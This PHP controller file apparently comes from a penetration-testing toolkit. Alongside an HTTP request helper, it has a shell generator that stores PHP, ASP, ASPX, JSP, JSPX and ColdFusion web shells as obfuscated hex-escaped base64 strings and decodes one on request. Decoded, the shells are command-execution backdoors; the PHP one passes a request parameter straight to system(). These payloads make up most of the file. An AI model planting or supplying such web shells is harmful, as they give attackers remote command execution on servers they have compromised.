<?php
/**
 * Purpose: Handles Your little Hurl.it like service ;)
 * additionally it offers web shells for your use

    
    Copyright (c) 2015 ~ alienwithin
    Munir Njiru <munir@skilledsoft.com>
 
        @version 1.0.0
        @date: 30.06.2015
        @url : http://munir.skilledsoft.com
 **/

namespace Controller;
/**
 * Handles Web Based Stuff in regard to webshells and Requests to other servers
 * @package Controller
 */

class Websaccre extends Mth3l3m3nt {
    /**
     * Loads the Main Interface Layout
     */

	public function beforeroute() {
		$this->response = new \View\Backend();
		$this->response->data['LAYOUT'] = 'websaccre_layout.html';
	}

    /**
     * Handles Your little Hurl.it like service to make requests to remote servers using various methods
     * @package Controller
     */
	public function generic_request(\Base $f3){
		$web=\Web::instance();
		$this->response->data['SUBPART'] = 'websaccre_generic_request.html';
		$audit_instance = \Audit::instance();
		
		if($f3->get('VERB') == 'POST') {
			$error = false;
			if($f3->devoid('POST.url')) {
				$error=true;
				\Flash::instance()->addMessage('Please enter a url e.g. http://africahackon.com','warning');
			} else {
				$audited_url=$audit_instance->url($f3->get('POST.url'));
				if ($audited_url==TRUE){

					//handle POST data
					$postReceive=$f3->get('POST.postReceive');
                    $createPostArray=parse_str($postReceive,$postData);


                    if( ini_get('safe_mode') ){
                        $follow_loc=FALSE;
                    }else{
                        $follow_loc=TRUE;
                    }


                    $address=$f3->get('POST.url');
					if ($f3->get('POST.means')=="POST"){
						$options = array(
								    'method'  => $f3->get('POST.means'),
								    'content' => http_build_query($postData),
                                    'follow_location'=>$follow_loc
								   
						);
                        $request_successful=$web->request($address,$options);

                    }
					elseif($f3->get('POST.means')=="GET" or $f3->get('POST.means')=="TRACE" or $f3->get('POST.means')=="OPTIONS" or $f3->get('POST.means')=="HEAD") {
						$options = array(
								    'method'  => $f3->get('POST.means'),
                                    'follow_location'=>$follow_loc

						);
                        $request_successful=$web->request($address,$options);

                    }
                    else{
                        \Flash::instance()->addMessage('Unsupported Header Method','danger');

                    }


					 if (!($request_successful)){
				    	\Flash::instance()->addMessage('Something went wrong your request could not be completed.','warning');
					  }
					else{
						$result_body=$request_successful['body'];
				    	$result_headers=$request_successful['headers'];
				    	$engine=$request_successful['engine'];
				    	$headers_max=implode("\n",$result_headers);
						$myFinalRequest="Headers: \n\n".$headers_max."\n\n Body:\n\n".$result_body."\n\n Engine Used: ".$engine;
						$this->response->data['content']=$myFinalRequest.var_dump($postData);
					}
					
				}
				else{
					\Flash::instance()->addMessage('You have entered an invalid URL try something like: http://africahackon.com','danger');
				}
				
			}
		}
	}

public function shellGenerator(\Base $f3){
		$this->response->data['SUBPART'] = 'websaccre_shellgen.html';
        $leg_ashell="\x20\x50\x43\x55\x4e\x43\x67\x30\x4b\x52\x47\x6c\x74\x49\x47\x39\x54\x4c\x47\x39\x54\x54\x6d\x56\x30\x4c\x47\x39\x47\x55\x33\x6c\x7a\x4c\x43\x42\x76\x52\x69\x78\x7a\x65\x6b\x4e\x4e\x52\x43\x77\x67\x63\x33\x70\x55\x52\x67\x30\x4b\x54\x32\x34\x67\x52\x58\x4a\x79\x62\x33\x49\x67\x55\x6d\x56\x7a\x64\x57\x31\x6c\x49\x45\x35\x6c\x65\x48\x51\x4e\x43\x6c\x4e\x6c\x64\x43\x42\x76\x55\x79\x41\x39\x49\x46\x4e\x6c\x63\x6e\x5a\x6c\x63\x69\x35\x44\x63\x6d\x56\x68\x64\x47\x56\x50\x59\x6d\x70\x6c\x59\x33\x51\x6f\x49\x6c\x64\x54\x51\x31\x4a\x4a\x55\x46\x51\x75\x55\x30\x68\x46\x54\x45\x77\x69\x4b\x51\x30\x4b\x55\x32\x56\x30\x49\x47\x39\x54\x54\x6d\x56\x30\x49\x44\x30\x67\x55\x32\x56\x79\x64\x6d\x56\x79\x4c\x6b\x4e\x79\x5a\x57\x46\x30\x5a\x55\x39\x69\x61\x6d\x56\x6a\x64\x43\x67\x69\x56\x31\x4e\x44\x55\x6b\x6c\x51\x56\x43\x35\x4f\x52\x56\x52\x58\x54\x31\x4a\x4c\x49\x69\x6b\x4e\x43\x6c\x4e\x6c\x64\x43\x42\x76\x52\x6c\x4e\x35\x63\x79\x41\x39\x49\x46\x4e\x6c\x63\x6e\x5a\x6c\x63\x69\x35\x44\x63\x6d\x56\x68\x64\x47\x56\x50\x59\x6d\x70\x6c\x59\x33\x51\x6f\x49\x6c\x4e\x6a\x63\x6d\x6c\x77\x64\x47\x6c\x75\x5a\x79\x35\x47\x61\x57\x78\x6c\x55\x33\x6c\x7a\x64\x47\x56\x74\x54\x32\x4a\x71\x5a\x57\x4e\x30\x49\x69\x6b\x4e\x43\x6e\x4e\x36\x51\x30\x31\x45\x49\x44\x30\x67\x55\x6d\x56\x78\x64\x57\x56\x7a\x64\x43\x35\x47\x62\x33\x4a\x74\x4b\x43\x4a\x44\x49\x69\x6b\x4e\x43\x6b\x6c\x6d\x49\x43\x68\x7a\x65\x6b\x4e\x4e\x52\x43\x41\x38\x50\x69\x41\x69\x49\x69\x6b\x67\x56\x47\x68\x6c\x62\x67\x30\x4b\x49\x43\x42\x7a\x65\x6c\x52\x47\x49\x44\x30\x67\x49\x6d\x4d\x36\x58\x48\x64\x70\x62\x6d\x52\x76\x64\x33\x4e\x63\x63\x47\x4e\x6f\x5a\x57\x46\x73\x64\x47\x68\x63\x52\x56\x4a\x53\x54\x31\x4a\x53\x52\x56\x42\x63\x55\x55\x68\x46\x51\x55\x52\x4d\x52\x56\x4e\x63\x49\x69\x41\x6d\x49\x43\x42\x76\x52\x6c\x4e\x35\x63\x79\x35\x48\x5a\x58\x52\x55\x5a\x57\x31\x77\x54\x6d\x46\x74\x5a\x53\x67\x70\x44\x51\x6f\x67\x49\x43\x63\x67\x53\x47\x56\x79\x5a\x53\x42\x33\x5a\x53\x42\x6b\x62\x79\x42\x30\x61\x47\x55\x67\x59\x32\x39\x74\x62\x57\x46\x75\x5a\x41\x30\x4b\x49\x43\x42\x44\x59\x57\x78\x73\x49\x47\x39\x54\x4c\x6c\x4a\x31\x62\x69\x67\x69\x64\x32\x6c\x75\x4c\x6d\x4e\x76\x62\x53\x42\x6a\x62\x57\x51\x75\x5a\x58\x68\x6c\x49\x43\x39\x6a\x49\x43\x49\x69\x49\x69\x41\x6d\x49\x48\x4e\x36\x51\x30\x31\x45\x49\x43\x59\x67\x49\x69\x41\x2b\x49\x43\x49\x67\x4a\x69\x42\x7a\x65\x6c\x52\x47\x49\x43\x59\x4e\x43\x69\x49\x69\x49\x69\x49\x73\x4d\x43\x78\x55\x63\x6e\x56\x6c\x4b\x51\x30\x4b\x49\x43\x42\x79\x5a\x58\x4e\x77\x62\x32\x35\x7a\x5a\x53\x35\x33\x63\x6d\x6c\x30\x5a\x53\x42\x7a\x65\x6c\x52\x47\x44\x51\x6f\x67\x49\x43\x63\x67\x51\x32\x68\x68\x62\x6d\x64\x6c\x49\x48\x42\x6c\x63\x6d\x31\x7a\x44\x51\x6f\x67\x49\x45\x4e\x68\x62\x47\x77\x67\x62\x31\x4d\x75\x55\x6e\x56\x75\x4b\x43\x4a\x33\x61\x57\x34\x75\x59\x32\x39\x74\x49\x47\x4e\x74\x5a\x43\x35\x6c\x65\x47\x55\x67\x4c\x32\x4d\x67\x59\x32\x46\x6a\x62\x48\x4d\x75\x5a\x58\x68\x6c\x49\x43\x49\x67\x4a\x69\x42\x7a\x65\x6c\x52\x47\x49\x43\x59\x67\x49\x69\x41\x76\x52\x53\x41\x76\x52\x77\x30\x4b\x5a\x58\x5a\x6c\x63\x6e\x6c\x76\x62\x6d\x55\x36\x52\x69\x49\x73\x4d\x43\x78\x55\x63\x6e\x56\x6c\x4b\x51\x30\x4b\x49\x43\x42\x54\x5a\x58\x51\x67\x62\x30\x59\x67\x50\x53\x42\x76\x52\x6c\x4e\x35\x63\x79\x35\x50\x63\x47\x56\x75\x56\x47\x56\x34\x64\x45\x5a\x70\x62\x47\x55\x6f\x63\x33\x70\x55\x52\x69\x77\x78\x4c\x45\x5a\x68\x62\x48\x4e\x6c\x4c\x44\x41\x70\x44\x51\x70\x46\x62\x6d\x51\x67\x53\x57\x59\x67\x44\x51\x6f\x6c\x50\x67\x30\x4b\x50\x45\x5a\x50\x55\x6b\x30\x67\x59\x57\x4e\x30\x61\x57\x39\x75\x50\x53\x49\x38\x4a\x54\x30\x67\x55\x6d\x56\x78\x64\x57\x56\x7a\x64\x43\x35\x54\x5a\x58\x4a\x32\x5a\x58\x4a\x57\x59\x58\x4a\x70\x59\x57\x4a\x73\x5a\x58\x4d\x6f\x49\x6c\x56\x53\x54\x43\x49\x70\x49\x43\x55\x2b\x49\x69\x42\x74\x5a\x58\x52\x6f\x62\x32\x51\x39\x49\x6c\x42\x50\x55\x31\x51\x69\x50\x67\x30\x4b\x50\x47\x6c\x75\x63\x48\x56\x30\x49\x48\x52\x35\x63\x47\x55\x39\x64\x47\x56\x34\x64\x43\x42\x75\x59\x57\x31\x6c\x50\x53\x4a\x44\x49\x69\x42\x7a\x61\x58\x70\x6c\x50\x54\x63\x77\x49\x48\x5a\x68\x62\x48\x56\x6c\x50\x53\x49\x38\x4a\x54\x30\x67\x63\x33\x70\x44\x54\x55\x51\x67\x4a\x54\x34\x69\x50\x67\x30\x4b\x50\x47\x6c\x75\x63\x48\x56\x30\x49\x48\x52\x35\x63\x47\x55\x39\x63\x33\x56\x69\x62\x57\x6c\x30\x49\x48\x5a\x68\x62\x48\x56\x6c\x50\x53\x4a\x53\x64\x57\x34\x69\x50\x6a\x77\x76\x52\x6b\x39\x53\x54\x54\x34\x38\x55\x46\x4a\x46\x50\x67\x30\x4b\x54\x57\x46\x6a\x61\x47\x6c\x75\x5a\x54\x6f\x67\x50\x43\x55\x39\x62\x31\x4e\x4f\x5a\x58\x51\x75\x51\x32\x39\x74\x63\x48\x56\x30\x5a\x58\x4a\x4f\x59\x57\x31\x6c\x4a\x54\x34\x38\x51\x6c\x49\x2b\x44\x51\x70\x56\x63\x32\x56\x79\x62\x6d\x46\x74\x5a\x54\x6f\x67\x50\x43\x55\x39\x62\x31\x4e\x4f\x5a\x58\x51\x75\x56\x58\x4e\x6c\x63\x6b\x35\x68\x62\x57\x55\x6c\x50\x6a\x78\x69\x63\x6a\x34\x4e\x43\x6a\x77\x6c\x49\x41\x30\x4b\x53\x57\x59\x67\x4b\x45\x6c\x7a\x54\x32\x4a\x71\x5a\x57\x4e\x30\x4b\x47\x39\x47\x4b\x53\x6b\x67\x56\x47\x68\x6c\x62\x67\x30\x4b\x49\x43\x42\x50\x62\x69\x42\x46\x63\x6e\x4a\x76\x63\x69\x42\x53\x5a\x58\x4e\x31\x62\x57\x55\x67\x54\x6d\x56\x34\x64\x41\x30\x4b\x49\x43\x42\x53\x5a\x58\x4e\x77\x62\x32\x35\x7a\x5a\x53\x35\x58\x63\x6d\x6c\x30\x5a\x53\x42\x54\x5a\x58\x4a\x32\x5a\x58\x49\x75\x53\x46\x52\x4e\x54\x45\x56\x75\x59\x32\x39\x6b\x5a\x53\x68\x76\x52\x69\x35\x53\x5a\x57\x46\x6b\x51\x57\x78\x73\x4b\x51\x30\x4b\x49\x43\x42\x76\x52\x69\x35\x44\x62\x47\x39\x7a\x5a\x51\x30\x4b\x49\x43\x42\x44\x59\x57\x78\x73\x49\x47\x39\x54\x4c\x6c\x4a\x31\x62\x69\x67\x69\x64\x32\x6c\x75\x4c\x6d\x4e\x76\x62\x53\x42\x6a\x62\x57\x51\x75\x5a\x58\x68\x6c\x49\x43\x39\x6a\x49\x47\x52\x6c\x62\x43\x41\x69\x4a\x69\x42\x7a\x65\x6c\x52\x47\x4c\x44\x41\x73\x56\x48\x4a\x31\x5a\x53\x6b\x4e\x43\x6b\x56\x75\x5a\x43\x42\x4a\x5a\x69\x41\x4e\x43\x67\x30\x4b\x4a\x54\x34\x3d\x20";
		$pshell="\x50\x44\x39\x77\x61\x48\x41\x67\x44\x51\x70\x70\x5a\x69\x41\x6f\x61\x58\x4e\x7a\x5a\x58\x51\x6f\x4a\x46\x39\x53\x52\x56\x46\x56\x52\x56\x4e\x55\x57\x79\x64\x6a\x62\x57\x51\x6e\x58\x53\x6b\x70\x65\x79\x41\x4e\x43\x69\x41\x67\x49\x43\x41\x6b\x59\x32\x31\x6b\x50\x53\x67\x6b\x58\x31\x4a\x46\x55\x56\x56\x46\x55\x31\x52\x62\x49\x6d\x4e\x74\x5a\x43\x4a\x64\x4b\x54\x73\x67\x44\x51\x6f\x67\x49\x43\x41\x67\x5a\x57\x4e\x6f\x62\x79\x42\x7a\x65\x58\x4e\x30\x5a\x57\x30\x6f\x4a\x47\x4e\x74\x5a\x43\x6b\x37\x49\x41\x30\x4b\x49\x43\x41\x67\x49\x47\x52\x70\x5a\x54\x73\x67\x44\x51\x70\x39\x49\x41\x30\x4b\x50\x7a\x34\x3d";
		$ashell="\x50\x43\x55\x4e\x43\x6b\x6c\x6d\x49\x43\x68\x79\x5a\x58\x46\x31\x5a\x58\x4e\x30\x4b\x43\x4a\x6a\x62\x57\x51\x69\x4b\x53\x41\x38\x50\x69\x41\x69\x49\x69\x6b\x67\x56\x47\x68\x6c\x62\x67\x30\x4b\x55\x6d\x56\x7a\x63\x47\x39\x75\x63\x32\x55\x75\x56\x33\x4a\x70\x64\x47\x55\x67\x55\x32\x56\x79\x64\x6d\x56\x79\x4c\x6b\x68\x55\x54\x55\x78\x46\x62\x6d\x4e\x76\x5a\x47\x55\x6f\x63\x32\x56\x79\x64\x6d\x56\x79\x4c\x6d\x4e\x79\x5a\x57\x46\x30\x5a\x57\x39\x69\x61\x6d\x56\x6a\x64\x43\x67\x69\x64\x33\x4e\x6a\x63\x6d\x6c\x77\x64\x43\x35\x7a\x61\x47\x56\x73\x62\x43\x49\x70\x4c\x6d\x56\x34\x5a\x57\x4d\x6f\x55\x32\x56\x79\x64\x6d\x56\x79\x4c\x6b\x31\x68\x63\x46\x42\x68\x64\x47\x67\x6f\x49\x6d\x4e\x74\x5a\x43\x35\x6c\x65\x47\x55\x69\x4b\x53\x59\x67\x49\x69\x41\x76\x59\x79\x41\x69\x49\x43\x59\x4e\x43\x67\x30\x4b\x63\x6d\x56\x78\x64\x57\x56\x7a\x64\x43\x67\x69\x59\x32\x31\x6b\x49\x69\x6b\x70\x4c\x6e\x4e\x30\x5a\x47\x39\x31\x64\x43\x35\x79\x5a\x57\x46\x6b\x59\x57\x78\x73\x4b\x51\x30\x4b\x52\x57\x35\x6b\x49\x45\x6c\x6d\x44\x51\x6f\x6c\x50\x67";
		$jshell="\x50\x43\x55\x67\x61\x57\x59\x67\x4b\x48\x4a\x6c\x63\x58\x56\x6c\x63\x33\x51\x75\x5a\x32\x56\x30\x55\x47\x46\x79\x59\x57\x31\x6c\x64\x47\x56\x79\x4b\x43\x4a\x6a\x62\x57\x51\x69\x4b\x53\x41\x68\x50\x53\x42\x75\x64\x57\x78\x73\x4b\x53\x42\x37\x49\x47\x39\x31\x64\x43\x35\x77\x63\x6d\x6c\x75\x64\x47\x78\x75\x4b\x43\x4a\x44\x62\x32\x31\x74\x59\x57\x35\x6b\x4f\x69\x41\x69\x49\x43\x73\x67\x63\x6d\x56\x78\x64\x57\x56\x7a\x64\x43\x35\x6e\x5a\x58\x52\x51\x59\x58\x4a\x68\x62\x57\x56\x30\x5a\x58\x49\x6f\x49\x6d\x4e\x74\x5a\x43\x49\x70\x49\x43\x73\x67\x49\x6a\x78\x69\x63\x69\x41\x76\x50\x69\x49\x70\x4f\x79\x42\x51\x63\x6d\x39\x6a\x5a\x58\x4e\x7a\x49\x48\x41\x67\x50\x53\x42\x53\x64\x57\x35\x30\x61\x57\x31\x6c\x4c\x6d\x64\x6c\x64\x46\x4a\x31\x62\x6e\x52\x70\x62\x57\x55\x6f\x4b\x53\x35\x6c\x65\x47\x56\x6a\x4b\x48\x4a\x6c\x63\x58\x56\x6c\x63\x33\x51\x75\x5a\x32\x56\x30\x55\x47\x46\x79\x59\x57\x31\x6c\x64\x47\x56\x79\x4b\x43\x4a\x6a\x62\x57\x51\x69\x4b\x53\x6b\x37\x49\x45\x39\x31\x64\x48\x42\x31\x64\x46\x4e\x30\x63\x6d\x56\x68\x62\x53\x42\x76\x63\x79\x41\x39\x49\x48\x41\x75\x5a\x32\x56\x30\x54\x33\x56\x30\x63\x48\x56\x30\x55\x33\x52\x79\x5a\x57\x46\x74\x4b\x43\x6b\x37\x49\x45\x6c\x75\x63\x48\x56\x30\x55\x33\x52\x79\x5a\x57\x46\x74\x49\x47\x6c\x75\x49\x44\x30\x67\x63\x43\x35\x6e\x5a\x58\x52\x4a\x62\x6e\x42\x31\x64\x46\x4e\x30\x63\x6d\x56\x68\x62\x53\x67\x70\x4f\x79\x42\x45\x59\x58\x52\x68\x53\x57\x35\x77\x64\x58\x52\x54\x64\x48\x4a\x6c\x59\x57\x30\x67\x5a\x47\x6c\x7a\x49\x44\x30\x67\x62\x6d\x56\x33\x49\x45\x52\x68\x64\x47\x46\x4a\x62\x6e\x42\x31\x64\x46\x4e\x30\x63\x6d\x56\x68\x62\x53\x68\x70\x62\x69\x6b\x37\x49\x46\x4e\x30\x63\x6d\x6c\x75\x5a\x79\x42\x6b\x61\x58\x4e\x79\x49\x44\x30\x67\x5a\x47\x6c\x7a\x4c\x6e\x4a\x6c\x59\x57\x52\x4d\x61\x57\x35\x6c\x4b\x43\x6b\x37\x49\x48\x64\x6f\x61\x57\x78\x6c\x49\x43\x67\x67\x5a\x47\x6c\x7a\x63\x69\x41\x68\x50\x53\x42\x75\x64\x57\x78\x73\x49\x43\x6b\x67\x65\x79\x42\x76\x64\x58\x51\x75\x63\x48\x4a\x70\x62\x6e\x52\x73\x62\x69\x68\x6b\x61\x58\x4e\x79\x4b\x54\x73\x67\x5a\x47\x6c\x7a\x63\x69\x41\x39\x49\x47\x52\x70\x63\x79\x35\x79\x5a\x57\x46\x6b\x54\x47\x6c\x75\x5a\x53\x67\x70\x4f\x79\x42\x39\x49\x48\x30\x67\x4a\x54\x34\x67";
		$jspx="\x50\x47\x70\x7a\x63\x44\x70\x79\x62\x32\x39\x30\x49\x48\x68\x74\x62\x47\x35\x7a\x4f\x6d\x70\x7a\x63\x44\x30\x69\x61\x48\x52\x30\x63\x44\x6f\x76\x4c\x32\x70\x68\x64\x6d\x45\x75\x63\x33\x56\x75\x4c\x6d\x4e\x76\x62\x53\x39\x4b\x55\x31\x41\x76\x55\x47\x46\x6e\x5a\x53\x49\x67\x65\x47\x31\x73\x62\x6e\x4d\x39\x49\x6d\x68\x30\x64\x48\x41\x36\x4c\x79\x39\x33\x64\x33\x63\x75\x64\x7a\x4d\x75\x62\x33\x4a\x6e\x4c\x7a\x45\x35\x4f\x54\x6b\x76\x65\x47\x68\x30\x62\x57\x77\x69\x49\x48\x68\x74\x62\x47\x35\x7a\x4f\x6d\x4d\x39\x49\x6d\x68\x30\x64\x48\x41\x36\x4c\x79\x39\x71\x59\x58\x5a\x68\x4c\x6e\x4e\x31\x62\x69\x35\x6a\x62\x32\x30\x76\x61\x6e\x4e\x77\x4c\x32\x70\x7a\x64\x47\x77\x76\x59\x32\x39\x79\x5a\x53\x49\x67\x64\x6d\x56\x79\x63\x32\x6c\x76\x62\x6a\x30\x69\x4d\x69\x34\x77\x49\x6a\x34\x4e\x43\x6a\x78\x71\x63\x33\x41\x36\x5a\x47\x6c\x79\x5a\x57\x4e\x30\x61\x58\x5a\x6c\x4c\x6e\x42\x68\x5a\x32\x55\x67\x59\x32\x39\x75\x64\x47\x56\x75\x64\x46\x52\x35\x63\x47\x55\x39\x49\x6e\x52\x6c\x65\x48\x51\x76\x61\x48\x52\x74\x62\x44\x74\x6a\x61\x47\x46\x79\x63\x32\x56\x30\x50\x56\x56\x55\x52\x69\x30\x34\x49\x69\x42\x77\x59\x57\x64\x6c\x52\x57\x35\x6a\x62\x32\x52\x70\x62\x6d\x63\x39\x49\x6c\x56\x55\x52\x69\x30\x34\x49\x69\x38";
		$cfmshell=" \x20\x50\x47\x68\x30\x62\x57\x77\x2b\x44\x51\x6f\x38\x59\x6d\x39\x6b\x65\x54\x34\x4e\x43\x67\x30\x4b\x50\x47\x4e\x6d\x62\x33\x56\x30\x63\x48\x56\x30\x50\x67\x30\x4b\x50\x48\x52\x68\x59\x6d\x78\x6c\x50\x67\x30\x4b\x50\x47\x5a\x76\x63\x6d\x30\x67\x62\x57\x56\x30\x61\x47\x39\x6b\x50\x53\x4a\x51\x54\x31\x4e\x55\x49\x69\x42\x68\x59\x33\x52\x70\x62\x32\x34\x39\x49\x69\x49\x2b\x44\x51\x6f\x67\x50\x48\x52\x79\x50\x67\x30\x4b\x49\x43\x41\x38\x64\x47\x51\x2b\x51\x32\x39\x74\x62\x57\x46\x75\x5a\x44\x6f\x38\x4c\x33\x52\x6b\x50\x67\x30\x4b\x49\x43\x41\x38\x64\x47\x51\x2b\x49\x44\x77\x67\x61\x57\x35\x77\x64\x58\x51\x67\x64\x48\x6c\x77\x5a\x54\x31\x30\x5a\x58\x68\x30\x49\x47\x35\x68\x62\x57\x55\x39\x49\x6d\x4e\x74\x5a\x43\x49\x67\x63\x32\x6c\x36\x5a\x54\x30\x31\x4d\x44\x78\x6a\x5a\x6d\x6c\x6d\x49\x47\x6c\x7a\x5a\x47\x56\x6d\x61\x57\x35\x6c\x5a\x43\x67\x69\x5a\x6d\x39\x79\x62\x53\x35\x6a\x62\x57\x51\x69\x4b\x54\x34\x67\x64\x6d\x46\x73\x64\x57\x55\x39\x49\x69\x4e\x6d\x62\x33\x4a\x74\x4c\x6d\x4e\x74\x5a\x43\x4d\x69\x49\x44\x77\x76\x59\x32\x5a\x70\x5a\x6a\x34\x2b\x49\x44\x77\x67\x59\x6e\x49\x2b\x50\x43\x39\x30\x5a\x44\x34\x4e\x43\x69\x41\x38\x4c\x33\x52\x79\x50\x67\x30\x4b\x49\x44\x78\x30\x63\x6a\x34\x4e\x43\x69\x41\x67\x50\x48\x52\x6b\x50\x6b\x39\x77\x64\x47\x6c\x76\x62\x6e\x4d\x36\x50\x43\x39\x30\x5a\x44\x34\x4e\x43\x69\x41\x67\x50\x48\x52\x6b\x50\x69\x41\x38\x49\x47\x6c\x75\x63\x48\x56\x30\x49\x48\x52\x35\x63\x47\x55\x39\x64\x47\x56\x34\x64\x43\x42\x75\x59\x57\x31\x6c\x50\x53\x4a\x76\x63\x48\x52\x7a\x49\x69\x42\x7a\x61\x58\x70\x6c\x50\x54\x55\x77\x49\x44\x78\x6a\x5a\x6d\x6c\x6d\x49\x47\x6c\x7a\x5a\x47\x56\x6d\x61\x57\x35\x6c\x5a\x43\x67\x69\x5a\x6d\x39\x79\x62\x53\x35\x76\x63\x48\x52\x7a\x49\x69\x6b\x2b\x49\x48\x5a\x68\x62\x48\x56\x6c\x50\x53\x49\x6a\x5a\x6d\x39\x79\x62\x53\x35\x76\x63\x48\x52\x7a\x49\x79\x49\x67\x50\x43\x39\x6a\x5a\x6d\x6c\x6d\x50\x69\x41\x2b\x50\x43\x42\x69\x63\x6a\x34\x67\x50\x43\x39\x30\x5a\x44\x34\x4e\x43\x69\x41\x38\x4c\x33\x52\x79\x50\x67\x30\x4b\x49\x44\x78\x30\x63\x6a\x34\x4e\x43\x69\x41\x67\x50\x48\x52\x6b\x50\x6c\x52\x70\x62\x57\x56\x76\x64\x58\x51\x36\x50\x43\x39\x30\x5a\x44\x34\x4e\x43\x69\x41\x67\x50\x48\x52\x6b\x50\x6a\x77\x67\x61\x57\x35\x77\x64\x58\x51\x67\x64\x48\x6c\x77\x5a\x54\x31\x30\x5a\x58\x68\x30\x49\x47\x35\x68\x62\x57\x55\x39\x49\x6e\x52\x70\x62\x57\x56\x76\x64\x58\x51\x69\x49\x48\x4e\x70\x65\x6d\x55\x39\x4e\x43\x41\x38\x59\x32\x5a\x70\x5a\x69\x42\x70\x63\x32\x52\x6c\x5a\x6d\x6c\x75\x5a\x57\x51\x6f\x49\x6d\x5a\x76\x63\x6d\x30\x75\x64\x47\x6c\x74\x5a\x57\x39\x31\x64\x43\x49\x70\x50\x69\x42\x32\x59\x57\x78\x31\x5a\x54\x30\x69\x49\x32\x5a\x76\x63\x6d\x30\x75\x64\x47\x6c\x74\x5a\x57\x39\x31\x64\x43\x4d\x69\x49\x44\x78\x6a\x5a\x6d\x56\x73\x63\x32\x55\x2b\x49\x48\x5a\x68\x62\x48\x56\x6c\x50\x53\x49\x31\x49\x69\x41\x38\x4c\x32\x4e\x6d\x61\x57\x59\x2b\x49\x44\x34\x67\x50\x43\x39\x30\x5a\x44\x34\x4e\x43\x69\x41\x38\x4c\x33\x52\x79\x50\x67\x30\x4b\x50\x43\x39\x30\x59\x57\x4a\x73\x5a\x54\x34\x4e\x43\x6a\x78\x70\x62\x6e\x42\x31\x64\x43\x42\x30\x65\x58\x42\x6c\x50\x58\x4e\x31\x59\x6d\x31\x70\x64\x43\x42\x32\x59\x57\x78\x31\x5a\x54\x30\x69\x52\x58\x68\x6c\x59\x79\x49\x67\x50\x67\x30\x4b\x50\x43\x39\x47\x54\x31\x4a\x4e\x50\x67\x30\x4b\x44\x51\x6f\x38\x59\x32\x5a\x7a\x59\x58\x5a\x6c\x59\x32\x39\x75\x64\x47\x56\x75\x64\x43\x42\x32\x59\x58\x4a\x70\x59\x57\x4a\x73\x5a\x54\x30\x69\x62\x58\x6c\x57\x59\x58\x49\x69\x50\x67\x30\x4b\x50\x47\x4e\x6d\x5a\x58\x68\x6c\x59\x33\x56\x30\x5a\x53\x42\x75\x59\x57\x31\x6c\x49\x44\x30\x67\x49\x69\x4e\x47\x62\x33\x4a\x74\x4c\x6d\x4e\x74\x5a\x43\x4d\x69\x49\x47\x46\x79\x5a\x33\x56\x74\x5a\x57\x35\x30\x63\x79\x41\x39\x49\x43\x49\x6a\x52\x6d\x39\x79\x62\x53\x35\x76\x63\x48\x52\x7a\x49\x79\x49\x67\x64\x47\x6c\x74\x5a\x57\x39\x31\x64\x43\x41\x39\x49\x43\x49\x6a\x52\x6d\x39\x79\x62\x53\x35\x30\x61\x57\x31\x6c\x62\x33\x56\x30\x49\x79\x49\x2b\x44\x51\x6f\x38\x4c\x32\x4e\x6d\x5a\x58\x68\x6c\x59\x33\x56\x30\x5a\x54\x34\x4e\x43\x6a\x77\x76\x59\x32\x5a\x7a\x59\x58\x5a\x6c\x59\x32\x39\x75\x64\x47\x56\x75\x64\x44\x34\x4e\x43\x6a\x78\x77\x63\x6d\x55\x2b\x44\x51\x6f\x6a\x62\x58\x6c\x57\x59\x58\x49\x6a\x44\x51\x6f\x38\x4c\x33\x42\x79\x5a\x54\x34\x4e\x43\x6a\x77\x76\x59\x32\x5a\x76\x64\x58\x52\x77\x64\x58\x51\x2b\x44\x51\x6f\x38\x4c\x32\x4a\x76\x5a\x48\x6b\x2b\x44\x51\x6f\x38\x4c\x32\x68\x30\x62\x57\x77\x2b";
        $shell_type=$f3->get('POST.shelltype');
		if($f3->get('VERB') == 'POST') {
			$error = false;
			switch ($shell_type) {
		    case "PHP":
		        $this->response->data['content']=base64_decode($pshell);
		    break;
		    case "ASP":
		       $this->response->data['content']=base64_decode($leg_ashell);
		    break;
            case "CFM":
                $this->response->data['content']=base64_decode($cfmshell);
            break;
            case "ASPX":
                $this->response->data['content']=base64_decode($ashell);
            break;
		    case "JSP":
		       $this->response->data['content']=base64_decode($jshell);
		    break;
		    case "JSPX":
		       $this->response->data['content']=base64_decode($jspx);
		    break;
		    default:
		    	$this->response->data['content']="Invalid Shell Type Request";
		    break;
			}
		}
	}
}